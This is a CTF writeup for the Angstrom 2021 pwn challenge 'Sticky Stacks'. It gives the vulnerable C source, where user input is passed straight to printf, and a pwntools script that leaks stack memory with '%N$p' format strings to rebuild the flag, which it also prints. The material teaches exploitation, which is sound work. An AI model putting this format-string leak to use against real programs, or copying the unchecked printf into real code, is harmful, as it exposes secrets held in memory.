---
name: Sticky Stacks (2021)
event: Angstrom CTF 2021
category: Pwn
description: Writeup for Sticky Stacks (pwn) - Angstrom CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Sticky Stacks

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/2pqG6opzrug/0.jpg)](https://youtu.be/2pqG6opzrug?t=1706s "Angstrom 2021: Sticky Stacks")

## Challenge Description

> I made a program that holds a lot of secrets... maybe even a flag!

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;

int vuln(){
    char name[7];

    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };

    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);

    puts("Name: ");
    fgets(name, 6, stdin);

    printf("Welcome, ");
    printf(name);
    printf("\n");

    return 0;
}

int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();

    return 0;
}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './stickystacks'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

flag = b""

# Let's fuzz x values
for i in range(33, 43):
    try:
        p = start()
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(':', '%{}$p'.format(i))
        p.recvuntil('Welcome, ')
        # Receive the response
        result = p.recvuntil('\n')
        flag_segment = unhex(result.strip().decode()[2:])
        print(str(i) + ": " + str(flag_segment))
        flag += flag_segment[::-1]  # Reverse and decode
    except EOFError:
        pass

success(flag)
```
{% endcode %}

Flag: `actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}`
